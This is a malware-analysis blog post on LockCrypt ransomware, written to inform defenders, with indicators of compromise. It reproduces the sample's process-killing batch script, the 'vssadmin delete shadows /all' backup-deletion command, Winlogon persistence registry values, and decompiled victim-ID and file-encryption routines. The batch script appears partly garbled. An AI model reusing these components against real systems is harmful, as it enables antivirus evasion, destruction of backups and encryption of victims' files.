---
title: "Analysis of LockCrypt ransomware"
date: 2017-12-01T04:43:00+05:30
slug: "analysis-of-lockcrypt-ransomware"
draft: false
tags:
  - "LockCrypt"
  - "Ransomware"
cover:
  image: "/images/analysis-of-lockcrypt-ransomware/lock_run-832d9973.png"
  alt: "Analysis of LockCrypt ransomware"
  relative: false
canonicalURL: "https://sdkhere.blogspot.com/2017/11/analysis-of-lockcrypt-ransomware.html"
ShowToc: true
TocOpen: false
---

**Introduction:**  
  
Attackers have been recently breaking into corporate servers via RDP brute force attacks to spread a new variant of ransomware called LockCrypt. The attacks first started in June but there was an increase of attacks in October. The victims were asked to pay 0.5 to 1 BTC to recover their server.  
LockCrypt encrypts all files and renames them with a '.lock' extension. It also installs itself for persistence and deletes backups.  
  
Let's have a look at the sample.  
  
MD5 : 12A4388ADE3FAD199631F6A00894104C [[VirusTotal](https://www.virustotal.com/#/file/1df3d4da1ef11373966f54a6d67c38a223229f272438e1c6ec7cb4c1ea3ff3e2)] [[HybridAnalysis](https://www.hybrid-analysis.com/sample/1df3d4da1ef11373966f54a6d67c38a223229f272438e1c6ec7cb4c1ea3ff3e2?environmentId=100)]  
Size  : 48128 bytes  
  
When we execute this sample, the following dialog box will appear.  
  
[![](/images/analysis-of-lockcrypt-ransomware/lock_run-832d9973.png)](/images/analysis-of-lockcrypt-ransomware/lock_run-832d9973.png)  
Fig1 : Window after execution of malware  

**Environment Setup :**  

On execution, first of all it copies itself to C:\Windows\bfsvcm.exe  
Then it creates a batch file named w.bat and executes it to kill all the specified processes; this is for antivirus and sandbox evasion.  
  
You can see the batch script below.  
  

```
SetLocal EnableDelayedExpansion EnableExtensions
Set WinTitle=%Random%%Random%
Title %WinTitle%
For /F "tokens=2 skip=2 delims=," %%P In ('tasklist /FI "WINDOWTITLE eq %WinTitle%" /FO CSV') Do (Set MyPID=%%~P)
Title %~n0
Set WhiteList=Microsoft.ActiveDirectory.WebServices.exe:cmd.exe:find.exe:conhost.exe:explorer.exe:ctfmon.exe:dllhost.exe:lsass.exe:services.exe:smss.exe:tasklist.exe:winlogon.exe:wmiprvse.exe:msdts.exe:bfsvc.exe:AdapterTroubleshooter.exe:alg.exe:dwm.exe:issch.exe:rundll32.exe:spoolsv.exe:wininit.exe:wmiprvse.exe:wudfhost.exe:taskmgr.exe:rdpclip.exe:logonui.exe:lsm.exe:spoolsv.exe:dwm.exe:dfssvc.exe:csrss.exe:svchost.exe:59F6B4DF10330000_59F6B4E800000000.exe:=5 delims=," %%p In ('tasklist /FO CSV') Do (Echo :!ProcList!|Find /I ":%%~p:">nul||Set ProcList=%%~p:!ProcList!)
:Compare
For /F "tokens=1,* delims=:" %%C In ("!ProcList!") Do (
If Not "%%C"=="" (
Echo :!WhiteList!|Find /I ":%%C:">nul||Call :Kill "%%C"
Set ProcList=%%D
GoTo Compare
)
)
Exit
:Kill
If "%~1"=="cmd.exe" (
TaskKill /F /FI "PID ne %MyPID%" /FI "IMAGENAME eq cmd.exe"
) Else (
TaskKill /F /IM "%~1"
)
del W.bat
Exit /B
```

  
After processes termination, it calls the DialogBoxParamA Windows API.  
It is abusing the Windows API to execute a malicious procedure.  
  
You can see the below code.  
[![](/images/analysis-of-lockcrypt-ransomware/dlgbx_abuse-8577ce0c.png)](/images/analysis-of-lockcrypt-ransomware/dlgbx_abuse-8577ce0c.png)  
Fig2 : DialogBoxParamA function call  
  
Here we have a callback function for the dialog box, so we will not skip this API.  
Let's look into the callback function.  
Here we have multiple cases; in the first case it is playing with the registry.  
  
First it uses ShellExecute to run the following command to delete backup storage.  
"vssadmin delete shadows /all"  
After that it creates a "Hacked" subkey in the following registry key.  
"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  
  
[![](/images/analysis-of-lockcrypt-ransomware/registry_hacked-6440695a.png)](/images/analysis-of-lockcrypt-ransomware/registry_hacked-6440695a.png)  
Fig3 : Storing victim id in registry  
  
By default it initializes the value of "Hacked" as "SfplHinIptOwnboa".  
This is the unique victim's id and it is very useful in the encryption process; this value is changed and reassigned to the registry later.  
  
After that, it will modify the below subkeys and values of the same registry key.  
  
LegalNoticeCaption = "Attention!!! Your files are encrypted !!!"  
LegalNoticeText = "To recover files, follow the prompts in the text file "Readme""  
Userinit = "C:\Windows\system32\userinit.exe, C:\Windows\bfsvcm.exe"  
  
This is for displaying a message on the logon screen of the user's system.  
  
[![](/images/analysis-of-lockcrypt-ransomware/winlogon-90ddfefe.jpg)](/images/analysis-of-lockcrypt-ransomware/winlogon-90ddfefe.jpg)  
Fig4 : Logon screen  
  
You can see the registry of my infected system.  
[![](/images/analysis-of-lockcrypt-ransomware/registry-4d870c82.png)](/images/analysis-of-lockcrypt-ransomware/registry-4d870c82.png)  
Fig5 : Registry of infected system  

**Encryption Process :**  

After the above environment setup, it creates the victim's id and stores it in the "Hacked" registry mentioned above.  
The code for creating the unique victim's id is:  
  

```
unsigned int sub_401AC7()
{
  unsigned int v0; // eax@1

  v0 = dword_40C86F;
  if ( !dword_40C86F )
  {
    v0 = GetTickCount();
    dword_40C86F = v0;
  }
  dword_40C86F = 16807 * (v0 % 0x1F31D) - 2836 * (v0 / 0x1F31D);
  return dword_40C86F % 0x64u;
}
```

  
After creating and assigning the id to the registry, the ransomware will send the base64 encoded victim information to the command and control server.  
  
[![](/images/analysis-of-lockcrypt-ransomware/packet_info-9c29fb11.jpg)](/images/analysis-of-lockcrypt-ransomware/packet_info-9c29fb11.jpg)  
Fig6 : Packet sent to C2 server  
  
The IP address of the server is 46.32.17[.]222 and the format of the information sent to the server is:  
Victim\_ID | Operating\_System | System | Malware\_Location  
  
When the server gets this information, it sends huge data in response.  
[![](/images/analysis-of-lockcrypt-ransomware/server_resp-e8eac3ce.jpg)](/images/analysis-of-lockcrypt-ransomware/server_resp-e8eac3ce.jpg)  
Fig7 : Server response after getting victim's info  
  
This data is unique and depends on the victim's information, and it plays a major role in the encryption process.  
  
The encryption algorithm is very simple; it just does XOR and byte swapping of file data with the data received from the server.  
You can see the encryption algorithm used by this ransomware below.  
  

```
unsigned __int32 __stdcall sub_401865(int a1, unsigned int a2)
{
  int v2; // ecx@1
  int v3; // edx@1
  int v4; // ebx@1
  int v5; // esi@1
  int v6; // edi@1
  unsigned int v7; // ecx@5
  int v8; // edx@5
  int v9; // ebx@5
  int v10; // esi@5
  int v11; // edi@5
  int v12; // eax@6
  unsigned __int32 result; // eax@6

  v2 = 2 * (a2 >> 2);
  v3 = dword_40D83C;
  v4 = dword_40D5B0 + dword_40D83C;
  v5 = a1;
  v6 = a1;
  do
  {
    *(_DWORD *)v6 = *(_DWORD *)v3 ^ *(_DWORD *)v5;
    v5 += 2;
    v6 += 2;
    v3 += 4;
    if ( v3 == v4 )
      v3 = dword_40D83C;
    --v2;
  }
  while ( v2 );
  v7 = a2 >> 2;
  v8 = dword_40D83C;
  v9 = dword_40D5B0 + dword_40D83C;
  v10 = a1;
  v11 = a1;
  do
  {
    v12 = *(_DWORD *)v10;
    v10 += 4;
    v12 = __ROL4__(v12, 5);
    result = _byteswap_ulong(*(_DWORD *)v8 ^ v12);
    *(_DWORD *)v11 = result;
    v11 += 4;
    v8 += 4;
    if ( v8 == v9 )
      v8 = dword_40D83C;
    --v7;
  }
  while ( v7 );
  return result;
}
```

  
It is very hard to make a decryption tool for this ransomware because the data changes as per the victim id and also we don't know the server-side algorithm.  
It skips the first 4 bytes and last 6 bytes of every file and encrypts the rest of the data.  
  
After the encryption, it will rename each file in the following format.  
File extension : [base64 of filename] ID [Victim ID].lock  
  
It drops ReadMe.TxT in C:\ which is a ransom note, and makes a run entry for the same to execute it on startup.  
Microsoft Windows Operating System = "C:\Windows\notepad.exe C:\ReadMe.TxT"  
  
[![](/images/analysis-of-lockcrypt-ransomware/ransom_note-87717604.png)](/images/analysis-of-lockcrypt-ransomware/ransom_note-87717604.png)  
Fig8 : Ransom note (ReadMe.TxT)  
  

**IOCs :**  

Hash  : 1df3d4da1ef11373966f54a6d67c38a223229f272438e1c6ec7cb4c1ea3ff3e2  
CnC   : 46.32.17[.]222  
Email : enigmax\_x@aol[.]com and enigmax\_x@bitmessage[.]ch
